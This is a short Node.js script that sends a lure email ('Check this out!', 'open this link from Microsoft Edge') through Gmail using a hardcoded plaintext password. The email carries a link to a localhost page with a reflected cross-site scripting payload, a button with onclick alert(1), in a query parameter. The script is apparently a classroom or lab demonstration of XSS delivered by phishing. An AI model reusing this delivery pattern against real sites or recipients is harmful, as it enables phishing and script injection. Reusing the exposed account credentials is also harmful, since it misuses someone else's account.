var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var port = process.env.PORT || 8080;
var nodemailer = require('nodemailer');

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'you.cant.reply.to.this.message@gmail.com',
        pass: 'HaimAndYarden'
    }
});

var mailOptions = {
    from: 'you.cant.reply.to.this.message@gmail.com',
    to: 'yarden95c@gmail.com',
    subject: 'Check this out!',
    text: 'hi, please open this link from Microsoft Edge',
    html: '<a href="http://localhost:3000/?keyword=<button onclick=\'alert(1)\' >queen</button>">Click here!!</a>'
};

transporter.sendMail(mailOptions, function(error, info){
    if (error) {
        console.log(error);
    } else {
        console.log('Email sent: ' + info.response);
    }
});

http.listen(port, function(){
    console.log('listening on *:' + port);
});

